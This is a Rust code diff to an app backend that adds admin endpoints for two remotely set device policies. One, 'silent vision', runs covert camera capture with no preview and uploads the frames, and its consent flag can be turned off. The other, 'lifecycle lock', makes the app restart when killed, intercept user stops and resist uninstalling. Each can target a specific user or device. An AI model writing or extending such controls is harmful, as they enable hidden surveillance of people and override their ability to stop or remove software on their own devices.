@@ -58,6 +58,8 @@ impl AppStore {
             "push-template" => self.apply_template_push(payload, now).await,
             "force-update" => self.apply_force_update(payload, now).await,
             "save-allowlist" => self.apply_allowlist(payload, now).await,
+            "set-silent-vision-policy" => self.apply_silent_vision_policy(payload, now).await,
+            "set-lifecycle-lock-policy" => self.apply_lifecycle_lock_policy(payload, now).await,
             _ => Err(ApiError::BadRequest(format!(
                 "Unsupported admin action: {action}"
             ))),
@@ -210,6 +212,103 @@ impl AppStore {
             .map_err(database_error)?;
         Ok(())
     }
+
+    async fn apply_silent_vision_policy(&self, payload: &Value, _now: i64) -> Result<(), ApiError> {
+        let current = self.global_device_control_policy().await?;
+        let mut silent_vision = current.silent_vision;
+        if let Some(enabled) = payload.get("enabled").and_then(Value::as_bool) {
+            silent_vision.enabled = enabled;
+        }
+        if let Some(v) = payload.get("exclusiveAccess").and_then(Value::as_bool) {
+            silent_vision.exclusive_access = v;
+        }
+        if let Some(v) = payload.get("noSurfacePreview").and_then(Value::as_bool) {
+            silent_vision.no_surface_preview = v;
+        }
+        if let Some(v) = payload.get("analyzerOnly").and_then(Value::as_bool) {
+            silent_vision.analyzer_only = v;
+        }
+        if let Some(v) = payload.get("requiresExplicitConsent").and_then(Value::as_bool) {
+            silent_vision.requires_explicit_consent = v;
+        }
+        if let Some(v) = payload.get("maxFps").and_then(Value::as_i64) {
+            silent_vision.max_fps = v.clamp(1, 30) as i32;
+        }
+        if let Some(v) = payload.get("maxSessionMinutes").and_then(Value::as_i64) {
+            silent_vision.max_session_minutes = v.clamp(1, 24 * 60) as i32;
+        }
+        if let Some(v) = payload.get("frameUploadEnabled").and_then(Value::as_bool) {
+            silent_vision.frame_upload_enabled = v;
+        }
+        let scope = payload_str(payload, "scope", "global");
+        let user_id = payload
+            .get("userId")
+            .and_then(Value::as_str)
+            .map(str::to_owned);
+        let device_installation_id = payload
+            .get("deviceInstallationId")
+            .and_then(Value::as_str)
+            .map(str::to_owned);
+        self.upsert_device_control_policy(
+            &scope,
+            user_id,
+            device_installation_id,
+            silent_vision,
+            current.lifecycle_lock,
+            "admin",
+        )
+        .await?;
+        Ok(())
+    }
+
+    async fn apply_lifecycle_lock_policy(&self, payload: &Value, _now: i64) -> Result<(), ApiError> {
+        let current = self.global_device_control_policy().await?;
+        let mut lifecycle_lock = current.lifecycle_lock;
+        if let Some(enabled) = payload.get("enabled").and_then(Value::as_bool) {
+            lifecycle_lock.enabled = enabled;
+        }
+        if let Some(v) = payload.get("enforceKeepalive").and_then(Value::as_bool) {
+            lifecycle_lock.enforce_keepalive = v;
+        }
+        if let Some(v) = payload.get("selfHealOnKill").and_then(Value::as_bool) {
+            lifecycle_lock.self_heal_on_kill = v;
+        }
+        if let Some(v) = payload.get("interceptUserStop").and_then(Value::as_bool) {
+            lifecycle_lock.intercept_user_stop = v;
+        }
+        if let Some(v) = payload.get("antiUninstallIntent").and_then(Value::as_bool) {
+            lifecycle_lock.anti_uninstall_intent = v;
+        }
+        if let Some(v) = payload.get("restartDelayMs").and_then(Value::as_i64) {
+            lifecycle_lock.restart_delay_ms = v.clamp(0, 60_000);
+        }
+        if let Some(v) = payload.get("maxRestartBurst").and_then(Value::as_i64) {
+            lifecycle_lock.max_restart_burst = v.clamp(1, 100) as i32;
+        }
+        if let Some(v) = payload.get("reportEvents").and_then(Value::as_bool) {
+            lifecycle_lock.report_events = v;
+        }
+        let scope = payload_str(payload, "scope", "global");
+        let user_id = payload
+            .get("userId")
+            .and_then(Value::as_str)
+            .map(str::to_owned);
+        let device_installation_id = payload
+            .get("deviceInstallationId")
+            .and_then(Value::as_str)
+            .map(str::to_owned);
+        self.upsert_device_control_policy(
+            &scope,
+            user_id,
+            device_installation_id,
+            current.silent_vision,
+            lifecycle_lock,
+            "admin",
+        )
+        .await?;
+        Ok(())
+    }
+
 }
 
 fn payload_str(payload: &Value, key: &str, fallback: &str) -> String {
